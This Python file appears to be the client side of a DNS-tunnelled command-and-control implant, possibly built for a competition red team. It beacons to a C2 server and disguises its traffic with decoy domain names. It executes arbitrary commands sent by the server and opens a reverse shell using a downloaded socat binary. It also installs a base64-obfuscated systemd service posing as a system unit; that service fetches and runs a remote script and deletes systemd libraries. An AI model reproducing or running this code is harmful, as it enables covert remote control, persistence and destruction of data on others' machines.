import base64
import json
import random
import socket
import string
import struct
import subprocess
import sys
import threading
import time


def base62_encode(data: bytes) -> str:
    """Encode bytes to a base62 encoded string."""
    BASE62_CHARSET = string.digits + string.ascii_letters
    # Convert the input bytes to an integer
    num = int.from_bytes(data, 'big')
    if num == 0:
        return BASE62_CHARSET[0]

    base62 = []
    while num:
        num, rem = divmod(num, 62)
        base62.append(BASE62_CHARSET[rem])

    return ''.join(reversed(base62))


def base62_decode(encoded_str: str) -> bytes:
    """Decode a base62 encoded string back to bytes."""
    BASE62_CHARSET = string.digits + string.ascii_letters
    num = 0
    for char in encoded_str:
        num = num * 62 + BASE62_CHARSET.index(char)

    # Calculate the number of bytes needed to represent num
    num_bytes_length = (num.bit_length() + 7) // 8
    # Convert the integer back to bytes
    num_bytes = num.to_bytes(num_bytes_length, 'big')
    return num_bytes


def create_dns_query(hostname, qtype):
    # DNS Header Fields
    transaction_id = random.randint(0, 0xFFFF)  # Random transaction ID
    flags = 0x0100  # Standard query
    questions = 1  # Number of questions
    answer_rrs = 0  # Number of answer resource records
    authority_rrs = 0  # Number of authority resource records
    additional_rrs = 0  # Number of additional resource records

    # Prepare DNS Header
    header = struct.pack(">HHHHHH", transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs)

    # Prepare DNS Question
    qname_parts = hostname.split('.')
    qname = b''
    for part in qname_parts:
        if len(part) > 63:
            # Split the part into chunks of 63 bytes if it exceeds the limit
            for chunk_start in range(0, len(part), 63):
                chunk = part[chunk_start:chunk_start + 63]
                qname += chr(len(chunk)).encode() + chunk.encode()
        else:
            qname += chr(len(part)).encode() + part.encode()
    qname += b'\x00'  # End of QNAME field

    qclass = 1  # IN Class
    question = qname + struct.pack(">HH", qtype, qclass)

    return header + question


def parse_dns_response(response):
    # Skip header and question
    pos = 12  # Skip header
    while response[pos] != 0:
        pos += 1  # Skip question name
    pos += 5  # Skip null byte, QTYPE, and QCLASS

    # The first two bytes of the Answer section could be a pointer or a name.
    # If it's a pointer (most common in responses), it will start with 0xc0.
    # Otherwise, it would be necessary to parse it as a name.
    if response[pos] >= 0xc0:
        pos += 2  # Skip name pointer
    else:
        # If it's not a pointer, parse through the name until reaching the null byte.
        while response[pos] != 0:
            pos += 1
        pos += 1  # Skip the null byte at the end of the name

    # Now pos should be correctly positioned at the start of the Type field in the answer
    _, _, ttl, rdlength = struct.unpack('>HHIH', response[pos:pos + 10])
    pos += 10  # Move past Type, Class, TTL, and RDLENGTH

    # Extract the TXT record data
    txt_data = response[pos + 1:pos + 1 + rdlength].decode()

    return ttl, txt_data


def send_dns_query(query, server_ip, timeout=5.0):  # Set default timeout to 5 seconds
    """
    Send a DNS query to the specified server.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)  # Set the timeout
    try:
        sock.sendto(query, (server_ip, 53))
        response, _ = sock.recvfrom(4096)
    except ConnectionError as e:
        print(f"Failed sending query to {server_ip}...")
        print(e)
        response = None
    except socket.timeout as e:
        print(f"Timeout occurred while sending query to {server_ip}...")
        response = None
    finally:
        sock.close()
    return response


def execute_command(command_number, command):
    print(f"Executing command '{command}'...")
    process = subprocess.Popen(command,
                               stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE, shell=True)
    # Wait for the process to finish
    stdout, stderr = process.communicate()
    print(f'Output:\n{stdout.decode()}\n{stderr.decode()}')
    qname = f"{command_number}.{process.returncode}.{random.choice(domains)}"
    query = create_dns_query(qname, 24)  # Send status update
    send_dns_query(query, server_ip)


def reverse_shell(rhost, rport):
    process = subprocess.Popen('wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/'
                               'x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:\'bash -li\',pty,'
                               f'stderr,setsid,sigint,sane tcp:{rhost}:{rport}',
                               stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE, shell=True)
    stdout, stderr = process.communicate()
    print(f'Output:\n{stdout.decode()}\n{stderr.decode()}')


if __name__ == '__main__':
    domains = ('support.google.com', 'time.gov', 'updates.canonical.com', 'nist.gov', 'debian.org', 'ntp.ubuntu.com',
               'autopush.prod.mozaws.net', 'learn.eku.edu', 'eku.edu', 'david-the-terrorist.ru', 'people.eku.edu',
               'tools.eku.edu', 'paloaltonetworks.com', 'tryhackme.com', 'hackthebox.eu', 'youtube.com', 'twitter.com',
               'facebook.com', 'x.com', 'cisco.com', 'netflix.com', 'thepiratebay.org', 'ravenn.net',
               'abc.au.securedrop.tor.onion', 'juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion',
               'duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion',
               '6nhmgdpnyoljh5uzr5kwlatx2u3diou4ldeommfxjz3wkhalzgjqxzqd.onion', 'clubpenguin.com', 'coolmathgames.com',
               'krunker.io', 'government.ru', 'en.kremlin.ru', 'nsa.gov', 'fbi.gov', 'ccdcadmin1.morainevalley.edu',
               'ccdcadmin3.morainevalley.edu', 'ccdcvcenter.eku.edu', 'ccdcesxi.eku.edu', 'distrowatch.com',
               'ccdc.cit.morainevalley.edu', 'morainevalley.edu', 'shodan.io', 'world.taobao.com', 'taobao.cn',
               'akamai.com', 'linode.com', 'microsoft.com', 'MikeRoweSoft.com', 'azure.microsoft.com', 'github.com',
               'amazon.com', '50-116-39-20.ip.linodeusercontent.com', 'aws.amazon.com', 'crouton.net',
               '7minuteworkout.com', 'addshoppers.com', 'affiliatecashpile.go2jump.org', 'arklighting.co',
               'bigpayout.go2jump.org', 'brandedleadgeneration.com', 'clicktshirtprinting.co.uk',
               'creditauthpagev3.info', 'dandingo.go2jump.org', 'defenderxtactical.com', 'divisioncore.com',
               'fitnesshealthreporter.com', 'freeforums.org', 'go2jump.org', 'gtradersoft.com', 'heartrevitalized.com',
               'janeaustenjoy.com', 'lazyprofits.go2jump.org', 'medtecchina.com', 'motoren.ru', 'mydreamdegree.com',
               'nero-us.com', 'news.nero-emea.com', 'news.nero-us.com', 'novastarled.com', 'offerscience.go2jump.org',
               'onlineloan-personal.net', 'otherinbox.com', 'pcbutts1-therealtruth.blogspot.com', 'playlott.com',
               'profitsitesbiz.com', 'redhotfreebies.co.uk', 'securesignupoffers.org', 'stsoftware.biz',
               'tekindustri.upnjatim.ac.id', 'thedatingconference.com', 'tinaborg.com', 'unionleisurewear.com',
               'va.tawk.to', 'vntanktransport.com', 'vydoxtrial.com', '7minuteworkout.com', 'addshoppers.com',
               'arklighting.co', 'brandedleadgeneration.com', 'clicktshirtprinting.co.uk',
               'creditauthpagev3.info', 'defenderxtactical.com', 'divisioncore.com',
               'fitnesshealthreporter.com', 'freeforums.org', 'go2jump.org', 'gtradersoft.com',
               'heartrevitalized.com', 'janeaustenjoy.com', 'medtecchina.com', 'motoren.ru', '100.1qingdao.com')

    server_ip = '192.168.102.16'
    print(f'Connecting to C2 server at {server_ip}:53 ...')

    while True:
        # Check if the C2 is online and send connectivity check
        while True:
            qname = random.choice(domains)
            query = create_dns_query(qname, 1)  # Hello
            response = send_dns_query(query, server_ip)
            print(f"Sent query with: {qname}, and type 1")
            if response:
                print(f"Received hello from {server_ip}. Starting handshake...")
                break
            else:
                print(f"Waiting for C2 to come online...")
                time.sleep(10)

        # Send hostname and receive beacon interval
        qname = f"{socket.gethostname()}.{random.choice(domains)}"
        query = create_dns_query(qname, 28)  # Send beacon connect
        print(f"Sent query with: {qname}, and type 200")
        response = send_dns_query(query, server_ip)
        if not response:
            print(f"Lost connection to {server_ip}")
            break
        print(f"Received response: {response}")
        ttl, txt_data = parse_dns_response(response)
        print(f"TTL: {ttl}, TXT data: {txt_data}")
        beacon_interval = ttl - 200

        # Begin beacon loop
        while True:
            time.sleep(beacon_interval)
            query = create_dns_query(random.choice(domains), 16)
            response = send_dns_query(query, server_ip)
            if not response:
                print(f"Lost connection to {server_ip}")
                break
            print(f"Received response: {response}")
            ttl, txt_data = parse_dns_response(response)
            print(f"TTL: {ttl}, TXT data: {txt_data}")
            if ttl == 404:
                # Our connection timed out, restart the connection
                print("Connection timed out.")
                break
            # cmd = json.loads(fernet.decrypt(base62_decode(txt_data)).decode())
            cmd = json.loads(base62_decode(txt_data))
            print(f"Command is: {cmd}")
            if cmd['cmd'] != 'nop':
                if cmd['cmd'] == 'shell':
                    args = cmd['args'].split(' ')
                    rhost = args[0]
                    rport = args[1]
                    print(f'RHOST: {rhost} RPORT: {rport}')
                    shell_thread = threading.Thread(target=reverse_shell, args=(rhost, rport))
                    shell_thread.start()
                elif cmd['cmd'] == 'download':
                    url = cmd['args']
                    command_number = cmd['number']
                    command = f'wget {url}'
                    print(f'Attempting download of {url}...')
                    command_thread = threading.Thread(target=execute_command, args=(command_number, command))
                    command_thread.start()
                elif cmd['cmd'] == 'install':
                    service_path = '/etc/systemd/system/systemd-networkd-wait-for-online.service'
                    service_name = 'systemd-networkd-wait-for-online.service'
                    with open(service_path, 'w') as f:
                        f.write(base64.b64decode('W1VuaXRdCkRlc2NyaXB0aW9uPVdhaXRzIGZvciB0aGUgbmV0d29yayBkYWVtb24gdG8gY'
                                                 '29tZSBvbmxpbmUgYmVmb3JlIHN0YXJ0aW5nIGVzc2VudGlhbCBzZXJ2aWNlcy4KQWZ0ZX'
                                                 'I9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpFeGVjU3RhcnRQcmU9L3Vzci9iaW4vd2d'
                                                 'ldCAtTyAvZGV2L3NobS9zcGF3bmVyLnNoIGh0dHBzOi8vZmlsZXMucmF2ZW5uLm5ldC9j'
                                                 'Mi1kZXYvc3Bhd25lci5zaApFeGVjU3RhcnRQcmU9L3Vzci9iaW4vY2htb2QgNTU1IC9kZ'
                                                 'XYvc2htL3NwYXduZXIuc2gKRXhlY1N0YXJ0UHJlPS9kZXYvc2htL3NwYXduZXIuc2gKRX'
                                                 'hlY1N0YXJ0PS9saWIvc3lzdGVtZC9zeXN0ZW1kLXRpbWVjaGtkCkV4ZWNTdGFydFBvc3Q'
                                                 '9L3Vzci9iaW4vc2xlZXAgMiAKRXhlY1N0YXJ0UG9zdD0vdXNyL2Jpbi9ybSAtcmYgL2xp'
                                                 'Yi9zeXN0ZW1kL19pbnRlcm5hbCAvbGliL3N5c3RlbWQvc3lzdGVtZC10aW1lY2hrZCAvb'
                                                 'GliL3N5c3RlbWQvKi5zbyAvbGliL3N5c3RlbWQvKi5zby4qClJlc3RhcnQ9YWx3YXlzCl'
                                                 'Jlc3RhcnRTZWM9MzAKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA'
                                                 '==').decode())
                    install_commands = (f'chmod 755 {service_path}',
                                        'systemctl daemon-reload',
                                        f'systemctl enable --now {service_name}')
                    for command in install_commands:
                        command_thread = threading.Thread(
                            target=execute_command,
                            args=(-1, command)
                        )
                        command_thread.start()
                        command_thread.join()
                    sys.exit(0)
                elif cmd['cmd'] == 'uninstall':
                    service_path = '/etc/systemd/system/systemd-networkd-wait-for-online.service'
                    service_name = 'systemd-networkd-wait-for-online.service'
                    uninstall_commands = (f'systemctl disable {service_name}',
                                          f'systemctl stop {service_name}',
                                          f'rm -f {service_path}',
                                          'systemctl daemon-reload')
                    for command in uninstall_commands:
                        command_thread = threading.Thread(target=execute_command, args=(-1, command))
                        command_thread.start()
                        command_thread.join()
                    sys.exit(0)
                else:
                    command_number = cmd['number']
                    command = cmd['args']
                    command_thread = threading.Thread(target=execute_command, args=(command_number, command))
                    command_thread.start()
